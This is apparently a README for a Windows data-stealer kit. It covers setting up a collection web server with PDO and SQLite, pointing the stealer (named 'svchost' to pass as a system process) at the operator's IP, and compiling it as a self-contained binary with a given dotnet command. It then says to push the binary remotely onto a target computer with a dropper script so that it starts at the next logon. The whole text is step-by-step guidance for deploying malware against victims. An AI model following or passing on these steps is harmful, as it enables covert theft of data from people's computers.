- Just put the "web server" folder content in your own web server folder with PDO and Sqlite installed

- In the "svchost - source code" folder, which is the stealer source code, modify the "server_ip" in Main function to your own web server IP address
- Then compile it with Visual Studio Code with the following command line :

dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true

- Move the new compiled binary from svchost\bin\Release\net7.0\win-x64\publish to the python dropper folder
- Remotely upload your compiled stealer to your target computer with the dropper script (need admin privs on target)
- The binary will be started on next user logon